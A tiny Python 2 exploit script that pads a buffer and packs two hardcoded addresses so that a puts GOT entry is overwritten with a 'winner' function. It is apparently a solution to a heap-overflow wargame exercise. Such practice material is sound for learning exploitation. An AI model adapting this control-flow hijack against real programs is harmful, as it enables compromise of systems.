import struct
WINNER=0x8048494
PUTPLT=0x8049774
exploit="AAAABBBBCCCCDDDDEEEE"
exploit+=struct.pack("I", PUTPLT)
exploit+=" "
exploit+=struct.pack("I", WINNER)
print exploit